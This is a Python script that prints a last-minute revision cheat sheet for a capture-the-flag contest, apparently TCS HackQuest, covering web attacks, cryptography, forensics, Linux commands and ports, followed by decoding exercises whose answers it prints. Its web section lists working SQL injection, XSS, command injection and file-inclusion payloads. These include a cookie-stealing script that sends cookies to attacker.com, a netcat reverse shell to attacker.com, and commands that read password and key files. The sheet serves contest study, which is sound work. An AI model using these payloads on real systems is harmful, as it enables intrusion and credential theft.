"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║            TCS HACKQUEST ROUND 2 - QUICK REVISION CHEAT SHEET                   ║
║                    Last Minute Preparation Guide                                 ║
╚══════════════════════════════════════════════════════════════════════════════════╝

Print this or keep it open during preparation!
"""

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 1: WEB VULNERABILITIES CHEAT SHEET
# ═══════════════════════════════════════════════════════════════════════════════

print("""
🔴 SQL INJECTION CHEAT SHEET
═════════════════════════════

AUTHENTICATION BYPASS:
  ' OR 1=1 --
  ' OR '1'='1
  admin'--
  admin' #
  ' OR 1=1 #
  ') OR ('1'='1

UNION BASED (Find columns first):
  ' ORDER BY 1-- (increase until error)
  ' UNION SELECT NULL--
  ' UNION SELECT NULL, NULL--
  ' UNION SELECT 1,2,3--
  ' UNION SELECT username, password FROM users--

EXTRACT DATA:
  ' UNION SELECT table_name,NULL FROM information_schema.tables--
  ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

BLIND SQL INJECTION:
  ' AND 1=1-- (True - normal response)
  ' AND 1=2-- (False - different response)
  ' AND SUBSTRING(username,1,1)='a'--
  ' AND SLEEP(5)-- (Time-based)

═════════════════════════════════════════════════════════════════════════════════

🟠 XSS (Cross-Site Scripting) CHEAT SHEET
═════════════════════════════════════════

BASIC PAYLOADS:
  <script>alert('XSS')</script>
  <script>alert(document.cookie)</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  <body onload=alert('XSS')>
  <div onmouseover=alert('XSS')>hover me</div>

FILTER BYPASS:
  <ScRiPt>alert('XSS')</ScRiPt>  (Mixed case)
  <script>alert(String.fromCharCode(88,83,83))</script>
  <img src=x onerror="alert('XSS')">
  <svg/onload=alert('XSS')>

STEAL COOKIES:
  <script>new Image().src="http://attacker.com/?c="+document.cookie</script>

═════════════════════════════════════════════════════════════════════════════════

🟡 COMMAND INJECTION CHEAT SHEET  
═════════════════════════════════

LINUX:
  ; ls -la
  | cat /etc/passwd
  `id`
  $(whoami)
  ; cat /etc/shadow
  | nc attacker.com 4444 -e /bin/sh

WINDOWS:
  & dir
  | type C:\\Windows\\System32\\config\\SAM
  & net user
  | whoami

FILTER BYPASS:
  ;ls${IFS}-la
  ;cat$IFS/etc/passwd
  ;c'a't /etc/passwd
  ;c"a"t /etc/passwd

═════════════════════════════════════════════════════════════════════════════════

🟢 LFI (Local File Inclusion) CHEAT SHEET
═════════════════════════════════════════

BASIC TRAVERSAL:
  ../../../etc/passwd
  ....//....//....//etc/passwd
  ..%2f..%2f..%2fetc/passwd
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

PHP WRAPPERS:
  php://filter/convert.base64-encode/resource=index.php
  php://input (with POST data)
  data://text/plain,<?php system('id'); ?>
  expect://id

WINDOWS:
  ..\\..\\..\\windows\\system32\\config\\sam
  C:\\Windows\\win.ini

IMPORTANT LINUX FILES:
  /etc/passwd
  /etc/shadow
  /etc/hosts
  /home/[user]/.ssh/id_rsa
  /var/www/html/index.php
  /proc/self/environ

═════════════════════════════════════════════════════════════════════════════════
""")

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 2: CRYPTOGRAPHY QUICK REFERENCE
# ═══════════════════════════════════════════════════════════════════════════════

print("""
🔐 CRYPTOGRAPHY QUICK REFERENCE
═══════════════════════════════

IDENTIFYING ENCODINGS:
─────────────────────
Base64:  Characters A-Z, a-z, 0-9, +, /, = (padding)
         Example: SGVsbG8gV29ybGQ=
         
Base32:  Characters A-Z, 2-7, = (padding)
         Example: JBSWY3DPEBLW64TMMQ======
         
Hex:     Characters 0-9, a-f (even length)
         Example: 48656c6c6f

Binary:  Only 0 and 1
         Example: 01001000 01101001

URL:     % followed by hex
         Example: Hello%20World

IDENTIFYING HASHES:
──────────────────
MD5:     32 hex chars    Example: 5d41402abc4b2a76b9719d911017c592
SHA1:    40 hex chars    Example: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
SHA256:  64 hex chars
SHA512:  128 hex chars
bcrypt:  Starts with $2a$, $2b$, or $2y$

CLASSICAL CIPHERS:
─────────────────
Caesar/ROT: Letter shifted by N positions
            ROT13: A→N, B→O, etc.
            
Atbash:     A→Z, B→Y, C→X (reverse alphabet)

Vigenère:   Uses keyword for shifting
            Key repeats: KEYKEYKEYKEY...

XOR:        ⊕ operation, self-reversing
            plaintext XOR key = ciphertext
            ciphertext XOR key = plaintext

USEFUL ONLINE TOOLS:
───────────────────
• CyberChef - The BEST tool! (gchq.github.io/CyberChef)
• dCode.fr - Cipher identifier & solvers
• CrackStation.net - Hash cracking
• MD5Decrypt.net - Hash databases

═════════════════════════════════════════════════════════════════════════════════
""")

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 3: FORENSICS QUICK REFERENCE
# ═══════════════════════════════════════════════════════════════════════════════

print("""
🔍 FORENSICS QUICK REFERENCE
════════════════════════════

FILE SIGNATURES (Magic Bytes):
─────────────────────────────
PNG:  89 50 4E 47 0D 0A 1A 0A  (‰PNG....)
JPEG: FF D8 FF E0 or FF D8 FF E1
GIF:  47 49 46 38 (GIF8)
PDF:  25 50 44 46 (%PDF)
ZIP:  50 4B 03 04 (PK..)
RAR:  52 61 72 21 (Rar!)
ELF:  7F 45 4C 46 (.ELF) - Linux executables
EXE:  4D 5A (MZ) - Windows executables
7z:   37 7A BC AF 27 1C

STEGANOGRAPHY TOOLS:
───────────────────
• steghide - Hide/extract data in JPEG/BMP/WAV/AU
  steghide extract -sf image.jpg
  
• zsteg - Detect stego in PNG/BMP
  zsteg image.png
  
• stegsolve - Visual analysis of images
  
• binwalk - Extract embedded files
  binwalk -e file.png
  
• exiftool - View/edit metadata
  exiftool image.jpg

• strings - Extract readable text
  strings file.bin | grep -i flag

WIRESHARK FILTERS:
─────────────────
http                         - All HTTP traffic
ip.addr == 192.168.1.1      - Specific IP
tcp.port == 80              - TCP port 80
http.request.method == POST - POST requests
tcp.flags.syn == 1          - SYN packets
frame contains "flag"       - Search for string
ftp                         - FTP traffic
telnet                      - Telnet traffic

Right-click → Follow → TCP Stream (to see conversation)

MEMORY FORENSICS (Volatility):
─────────────────────────────
volatility -f dump.raw imageinfo        - Identify OS
volatility -f dump.raw --profile=Win7SP1x64 pslist  - List processes
volatility -f dump.raw --profile=Win7SP1x64 filescan - Find files
volatility -f dump.raw --profile=Win7SP1x64 hashdump - Extract password hashes
volatility -f dump.raw --profile=Win7SP1x64 netscan  - Network connections

═════════════════════════════════════════════════════════════════════════════════
""")

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 4: LINUX COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

print("""
🐧 ESSENTIAL LINUX COMMANDS
═══════════════════════════

FILE OPERATIONS:
───────────────
ls -la              List all files with details
cat file.txt        Display file content
head -n 20 file     First 20 lines
tail -n 20 file     Last 20 lines
file filename       Determine file type
strings file        Extract printable strings
xxd file            Hex dump
hexdump -C file     Hex dump with ASCII

SEARCHING:
─────────
grep -r "flag" .              Search recursively
grep -i "password" file       Case-insensitive
find / -name "flag*" 2>/dev/null    Find files
locate filename               Quick file search

NETWORKING:
──────────
nc -lvnp 4444                 Listen on port 4444
nc target 80                  Connect to target
curl http://target            HTTP request
wget http://target/file       Download file
nmap -sV target               Scan with version detection

PERMISSIONS:
───────────
chmod +x file                 Make executable
chmod 777 file                Full permissions
sudo -l                       Check sudo rights

TEXT PROCESSING:
───────────────
cut -d':' -f1 /etc/passwd    Extract field
awk '{print $1}' file        Print first column
sort file | uniq             Unique sorted lines
base64 -d file               Decode base64

PROCESS/SYSTEM:
──────────────
ps aux                        List processes
netstat -tulpn               Open ports
id                           Current user info
uname -a                     System info
cat /etc/passwd              User accounts

═════════════════════════════════════════════════════════════════════════════════
""")

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 5: COMMON PORTS & SERVICES
# ═══════════════════════════════════════════════════════════════════════════════

print("""
🌐 COMMON PORTS REFERENCE
═════════════════════════

PORT    SERVICE         NOTES
────    ───────         ─────
20/21   FTP             File transfer (anonymous login?)
22      SSH             Secure shell (brute force?)
23      Telnet          Unencrypted remote access
25      SMTP            Email sending
53      DNS             Domain resolution
80      HTTP            Web server
110     POP3            Email retrieval
111     RPCBind         RPC service
139     NetBIOS         Windows networking
143     IMAP            Email
443     HTTPS           Secure web
445     SMB             Windows file sharing
3306    MySQL           Database
3389    RDP             Windows remote desktop
5432    PostgreSQL      Database
5900    VNC             Remote desktop
6379    Redis           Key-value store
8080    HTTP-Proxy      Alternative web
27017   MongoDB         NoSQL database

═════════════════════════════════════════════════════════════════════════════════
""")

# ═══════════════════════════════════════════════════════════════════════════════
#                    SECTION 6: PRACTICE EXERCISES
# ═══════════════════════════════════════════════════════════════════════════════

import base64

print("""
📝 INTERACTIVE PRACTICE EXERCISES
══════════════════════════════════
""")

# Exercise 1
print("EXERCISE 1: Base64 Decoding")
print("-" * 40)
encoded1 = "VENTSGFja1F1ZXN0e2Jhc2U2NF9pc19lYXN5fQ=="
print(f"Decode this: {encoded1}")
input("Press Enter to see answer...")
print(f"Answer: {base64.b64decode(encoded1).decode()}\n")

# Exercise 2
print("EXERCISE 2: Hex Decoding")
print("-" * 40)
hex_string = "666c61677b6865785f6465636f64696e677d"
print(f"Decode this hex: {hex_string}")
input("Press Enter to see answer...")
print(f"Answer: {bytes.fromhex(hex_string).decode()}\n")

# Exercise 3
print("EXERCISE 3: ROT13")
print("-" * 40)
rot13_text = "synt{ebg_guvegrra_vf_sha}"
print(f"Decode this ROT13: {rot13_text}")
input("Press Enter to see answer...")
def rot13(s):
    result = ""
    for c in s:
        if 'a' <= c <= 'z':
            result += chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
        elif 'A' <= c <= 'Z':
            result += chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
        else:
            result += c
    return result
print(f"Answer: {rot13(rot13_text)}\n")

# Exercise 4
print("EXERCISE 4: Caesar Cipher (Shift 3)")
print("-" * 40)
caesar_text = "iodj{fdhvdu_flskhu}"
print(f"Decode with shift -3: {caesar_text}")
input("Press Enter to see answer...")
def caesar(s, shift):
    result = ""
    for c in s:
        if 'a' <= c <= 'z':
            result += chr((ord(c) - ord('a') + shift) % 26 + ord('a'))
        elif 'A' <= c <= 'Z':
            result += chr((ord(c) - ord('A') + shift) % 26 + ord('A'))
        else:
            result += c
    return result
print(f"Answer: {caesar(caesar_text, -3)}\n")

# Exercise 5
print("EXERCISE 5: Double Encoded")
print("-" * 40)
double = "Wm14aFozdHRkV3gwYVY5bGJtTnZaR2x1WjMwPQ=="
print(f"Decode this (hint: encoded twice): {double}")
input("Press Enter to see answer...")
first = base64.b64decode(double).decode()
second = base64.b64decode(first).decode()
print(f"First decode: {first}")
print(f"Second decode: {second}\n")

# Exercise 6
print("EXERCISE 6: Binary to ASCII")
print("-" * 40)
binary = "01100110 01101100 01100001 01100111 01111011 01100010 01101001 01101110 01100001 01110010 01111001 01111101"
print(f"Decode this binary: {binary}")
input("Press Enter to see answer...")
binary_clean = binary.replace(" ", "")
result = ""
for i in range(0, len(binary_clean), 8):
    byte = binary_clean[i:i+8]
    result += chr(int(byte, 2))
print(f"Answer: {result}\n")

# Exercise 7
print("EXERCISE 7: Mixed Encoding Challenge")
print("-" * 40)
# Base64 of hex of text
original = "flag{multi_layer}"
hex_encoded = original.encode().hex()
b64_of_hex = base64.b64encode(hex_encoded.encode()).decode()
print(f"Decode this (Base64 → Hex → ASCII): {b64_of_hex}")
input("Press Enter to see answer...")
step1 = base64.b64decode(b64_of_hex).decode()
print(f"After Base64 decode: {step1}")
step2 = bytes.fromhex(step1).decode()
print(f"After Hex decode: {step2}\n")

print("""
═════════════════════════════════════════════════════════════════════════════════
                         GOOD LUCK WITH ROUND 2! 🎯
═════════════════════════════════════════════════════════════════════════════════
""")
